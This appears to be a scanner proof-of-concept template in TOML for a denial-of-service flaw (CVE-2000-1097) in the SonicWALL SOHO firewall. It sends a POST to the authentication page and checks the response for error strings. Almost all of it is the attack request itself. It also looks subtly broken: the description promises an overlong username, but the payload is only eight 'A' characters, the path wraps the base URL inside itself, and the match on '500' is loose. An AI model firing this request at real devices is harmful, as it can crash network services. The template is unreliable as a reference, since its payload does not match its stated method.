[info]
author = "ave"
description = "向 SonicWALL SOHO Firewall 认证页面发送超长用户名，触发 Web 服务进程崩溃导致拒绝服务"
id = "POC-AVE-2000-1082"
name = "SonicWALL SOHO Firewall Web Server DoS PoC"
severity = "medium"
tags = ["ave-2000-1082"]
vuln_id = [
    "CVE-2000-1097",
    "AVE-2000-1082",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/auth"
protocol = "http"

[poc.requests.body]
content = "username=AAAAAAAA&password=test"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Connection refused",
    "500",
]
